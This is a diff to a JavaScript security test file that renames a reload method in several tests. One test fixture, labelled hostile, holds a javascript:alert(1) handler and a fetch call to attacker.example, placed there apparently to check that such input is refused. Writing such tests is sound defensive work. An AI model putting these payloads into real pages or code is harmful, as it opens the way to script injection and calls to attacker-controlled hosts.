@@ -54,7 +54,7 @@ test("SEC-02 a document that names a command, an expression or a script URL chan
   const hostile = {
     web: target("web-build-a"),
     policy: { minimum: "1.0.0" },
-    commands: { requestReload: { handler: "javascript:alert(1)" } },
+    commands: { reload: { handler: "javascript:alert(1)" } },
     run: "() => fetch('https://attacker.example')",
   };
 
@@ -86,9 +86,7 @@ test("SEC-03 an answer that is already expired on arrival is expired evidence, a
   }
 
   expect(observation.evidence.freshness).toBe("expired");
-  await expect(
-    web.requestReload({ offer: observation.offer.ref }),
-  ).resolves.toEqual({
+  await expect(web.reload({ offer: observation.offer.ref })).resolves.toEqual({
     status: "stale",
     reason: "expired",
   });
@@ -209,7 +207,7 @@ test("an accepted reload does not put its offer's build in the diagnostics event
     events.push(JSON.stringify(event));
   });
 
-  const pending = context.beacon.route("web").requestReload({ offer });
+  const pending = context.beacon.route("web").reload({ offer });
 
   await settle();
   takeRun(context.runs).settleWith(ACCEPTED_RELOAD);
@@ -256,7 +254,7 @@ test("SEC-09 an accepted command is never an installation in the diagnostics", a
     events.push(event.type);
   });
 
-  const pending = context.beacon.route("web").requestReload({ offer });
+  const pending = context.beacon.route("web").reload({ offer });
 
   await settle();
   takeRun(context.runs).settleWith(ACCEPTED_RELOAD);
